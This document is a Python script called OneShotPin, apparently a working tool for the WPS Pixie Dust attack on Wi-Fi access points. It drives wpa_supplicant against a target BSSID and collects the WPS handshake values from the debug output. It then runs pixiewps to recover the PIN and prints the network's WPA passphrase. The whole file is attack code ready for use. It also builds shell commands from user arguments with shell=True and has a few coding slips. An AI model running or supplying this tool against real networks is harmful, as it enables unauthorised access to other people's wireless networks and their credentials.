#!/usr/bin/env python3

import sys
import subprocess
import os
import tempfile
import shutil


class Data():
    def __init__(self):
        self.pke = ''
        self.pkr = ''
        self.e_hash1 = ''
        self.e_hash2 = ''
        self.authkey = ''
        self.e_nonce = ''
        self.wpa_psk = ''
        self.state = ''


    def got_all(self):
        return self.pke and self.pkr and self.e_nonce and self.authkey and self.e_hash1 and self.e_hash2


    def get_pixie_cmd(self):
        return "pixiewps --pke {} --pkr {} --e-hash1 {} --e-hash2 {} --authkey {} --e-nonce {}".format(\
            self.pke, data.pkr, self.e_hash1, self.e_hash2, self.authkey, self.e_nonce)


class Options():
    def __init__(self):
        self.interface = None
        self.bssid = None
        self.pin = None
        self.essid = None
        self.pixiemode = False
        self.verbose = False


def shellcmd(cmd):
    proc = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, encoding='utf-8')
    result = proc.stdout.read()
    proc.wait()
    return result


def run_wpa_supplicant(options):
    options.tempdir = tempfile.mkdtemp()
    with tempfile.NamedTemporaryFile(mode='w', suffix='.conf', delete=False) as temp:
        temp.write("ctrl_interface={}\nctrl_interface_group=root\nupdate_config=1\n".format(options.tempdir))
        options.tempconf=temp.name
    cmd = 'wpa_supplicant -K -d -Dnl80211,wext,hostapd,wired -i{} -c{}'.format(options.interface, options.tempconf)
    proc = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, encoding='utf-8')
    return proc


def run_wpa_cli(options):
    cmd = 'wpa_cli -i{} -p{}'.format(options.interface, options.tempdir)
    proc = subprocess.Popen(cmd, shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, encoding='utf-8')
    recvuntil(proc, '\n>')
    return proc


def wps_reg(options):
    cmd = 'wpa_cli -i{} -p{}'.format(options.interface, options.tempdir)
    command = 'wps_reg {} {}\nquit\n'.format(options.bssid, options.pin)
    proc = subprocess.run(cmd, shell=True, input=command, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, encoding='utf-8')
    status = False
    if 'OK' in proc.stdout:
        status = True
    return status


def recvuntil(pipe, what):
    s = ''
    while True:
        inp = pipe.stdout.read(1)
        if inp == '': return s
        s += inp
        if what in s: return s



def statechange(data, old, new):
    print('{} -> {}'.format(old, new))
    data.state = new
    return True


def get_hex(line):
        a = line.split(':', 3)
        return a[2].replace(' ', '')


def process_wpa_supplicant(pipe, options, data):
    line = pipe.stdout.readline()
    if line == '':
        pipe.wait()
        return False
    line = line.rstrip('\n')

    if options.verbose: sys.stderr.write(line + '\n')

    if line.startswith('WPS: '):
        if 'Enrollee Nonce' in line and 'hexdump' in line:
            data.e_nonce = get_hex(line)
            assert(len(data.e_nonce) == 16*2)
        elif 'DH own Public Key' in line and 'hexdump' in line:
            data.pkr = get_hex(line)
            assert(len(data.pkr) == 192*2)
        elif 'DH peer Public Key' in line and 'hexdump' in line:
            data.pke = get_hex(line)
            assert(len(data.pke) == 192*2)
        elif 'AuthKey' in line and 'hexdump' in line:
            data.authkey = get_hex(line)
            assert(len(data.authkey) == 32*2)
        elif 'E-Hash1' in line and 'hexdump' in line:
            data.e_hash1 = get_hex(line)
            assert(len(data.e_hash1) == 32*2)
        elif 'E-Hash2' in line and 'hexdump' in line:
            data.e_hash2 = get_hex(line)
            assert(len(data.e_hash2) == 32*2)
        elif 'Network Key' in line and 'hexdump' in line:
            data.wpa_psk = bytes.fromhex(get_hex(line)).decode('utf-8')
        elif 'Building Message M' in line:
            statechange(data, data.state, 'M' + line.split('Building Message M')[1])
        elif 'Received M' in line:
            statechange(data, data.state, 'M' + line.split('Received M')[1])

    elif ': State: ' in line:
        statechange(data, *line.split(': State: ')[1].split(' -> '))
    elif 'WPS-FAIL' in line:
        print("WPS-FAIL :(")
        return False

    elif 'NL80211_CMD_DEL_STATION' in line:
        #if data.state == 'ASSOCIATED':
        #   print "URGH"
        print("[ERROR]: unexpected interference - kill NetworkManager/wpa_supplicant!")
        #return False
    elif 'Trying to authenticate with' in line:
        print(line)
    elif 'Authentication response' in line:
        print(line)
    elif 'Trying to associate with' in line:
        print(line)
        options.essid = line.split("'")[1]
    elif 'Associated with' in line:
        print(line)
    elif 'EAPOL: txStart' in line:
        print(line)

    return True


def poll_wpa_supplicant(wpas, options, data, wait_psk=False):
    while True:
        res = process_wpa_supplicant(wpas, options, data)

        if not res: break

        if data.got_all() and not wait_psk:
            return True
        if data.wpa_psk:
            return True


def parse_pixiewps(output):
    lines = output.splitlines()
    for line in lines:
        if ('[+]' in line) and ('WPS' in line):
            pin = line.split(':')[-1].strip()
            return pin
    return False


def die(msg):
    sys.stderr.write(msg + '\n')
    sys.exit(1)


def usage():
    die( \
"""
OneShotPin

Required Arguments:
    -i, --interface=<wlan0>  Name of the interface to use
    -b, --bssid=<mac>        BSSID of the target AP

Optional Arguments:
    -p, --pin=<wps pin>      Use the specified pin (arbitrary string or 4/8 digit pin)
    -K, --pixie-dust         Run pixiedust attack
    -v                       Verbose output

Example:
    %s -i wlan0 -b 00:90:4C:C1:AC:21 -K
""" % sys.argv[0])


def cleanup(wpas, options):
    wpas.terminate()
    shutil.rmtree(options.tempdir, ignore_errors=True)
    os.remove(options.tempconf)

if __name__ == '__main__':
    options = Options()

    import getopt
    optlist, args = getopt.getopt(sys.argv[1:], ":e:i:b:p:Kv", ["help", "interface", "bssid", "pin", "pixie-dust"])
    for a,b in optlist:
        if   a in ('-i', "--interface"): options.interface = b
        elif a in ('-b', "--bssid"): options.bssid = b
        elif a in ('-p', "--pin"): options.pin = b
        elif a in ('-K', "--pixie-dust"): options.pixiemode = True
        elif a in ('-v'): options.verbose = True
        elif a == '--help': usage()
    if not options.interface or not options.bssid:
        die("Missing required argument! (use --help for usage)")
    if options.pin == None and not options.pixiemode:
        die("You need to supply a pin or enable pixiemode! (use --help for usage)")
    if options.pin == None and options.pixiemode:
        options.pin = '12345670'

    if os.getuid() != 0:
        die("Run it as root")

    data = Data()
    wpas = run_wpa_supplicant(options)
    while True:
        s = recvuntil(wpas, '\n')
        if options.verbose: sys.stderr.write(s)
        if 'update_config=1' in s: break

    
    if not wps_reg(options):
        cleanup(wpas, options)
        die('Error while launching wpa_cli')


    if not options.pixiemode:
        wait_psk = True
    else:
        wait_psk = False
    try:
        poll_wpa_supplicant(wpas, options, data, wait_psk)
    except KeyboardInterrupt:
        print("\nAborting...")
        cleanup(wpas, options)
        sys.exit(1)

    if data.got_all():
        pixiecmd = data.get_pixie_cmd()

    if options.pixiemode and pixiecmd:
        print("Running Pixiewps...")
        if options.verbose: print("Cmd: {}".format(pixiecmd))
        out = shellcmd(pixiecmd)
        print(out)
        a = parse_pixiewps(out)
        if a:
            print('Trying to get password with the correct pin...')
            options.pin = a
            try:
                poll_wpa_supplicant(wpas, options, data, True)
            except KeyboardInterrupt:
                print("\nAborting...")
            if data.wpa_psk:
                print("[+] WPS PIN: {}".format(options.pin))
                print("[+] WPA PSK: {}".format(data.wpa_psk))
                print("[+] AP SSID: {}".format(options.essid))
                cleanup(wpas, options)
                sys.exit(0)
            cleanup(wpas, options)
            sys.exit(1)
        else:
            cleanup(wpas, options)
            sys.exit(1)

    if data.wpa_psk:
        cleanup(wpas, options)
        print("[+] WPS PIN: {}".format(options.pin))
        print("[+] WPA PSK: {}".format(data.wpa_psk))
        print("[+] AP SSID: {}".format(options.essid))
        sys.exit(0)

    print("hmm, seems something went wrong...")
    cleanup(wpas, options)
    sys.exit(1)
